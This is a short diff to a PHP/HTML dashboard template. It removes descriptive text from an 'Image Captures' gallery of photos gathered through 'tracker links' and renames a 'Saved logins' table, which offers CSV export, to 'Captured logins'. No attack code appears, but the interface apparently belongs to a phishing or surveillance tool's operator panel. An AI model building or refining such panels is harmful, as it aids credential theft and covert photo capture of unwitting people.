@@ -1751,7 +1751,6 @@ $userNavInitial = $userNavInitial ?? '?';
                     <h2 class="gallery-title">Image Captures</h2>
                     <span id="photoCount" style="font-size:13px;color:var(--text-muted)"></span>
                 </div>
-                <p class="subtitle card-view-desc" style="margin-bottom:14px">Image Captures is a visual log with advanced context for verification photos—review thumbnails from your tracker links, select batches, and manage storage from one gallery.</p>
                 <div class="gallery-toolbar" id="galleryToolbar">
                     <label class="gallery-toolbar-label">
                         <input type="checkbox" id="gallerySelectAll" title="Select all on this page">
@@ -1916,12 +1915,9 @@ $userNavInitial = $userNavInitial ?? '?';
                     <div class="phone-history">
                         <div class="card saved-logins-card">
                             <div class="saved-logins-card-head">
-                                <h2>Saved logins</h2>
+                                <h2>Captured logins</h2>
                                 <span class="saved-logins-count" id="savedInfoCountMeta" aria-live="polite"></span>
                             </div>
-                            <p class="subtitle card-view-desc" style="color:var(--text-muted);margin-bottom:14px">
-                                Saved logins is a structured table with timestamps and context for each submission—newest first, with CSV export for offline analysis.
-                            </p>
                             <div class="saved-logins-toolbar">
                                 <button type="button" class="btn btn-secondary" id="exportSavedInfoBtn" onclick="exportSavedInfoCsv()" disabled>Export CSV</button>
                                 <button type="button" class="btn btn-danger" id="clearSavedInfoBtn" onclick="clearSavedInfo()">Clear all</button>
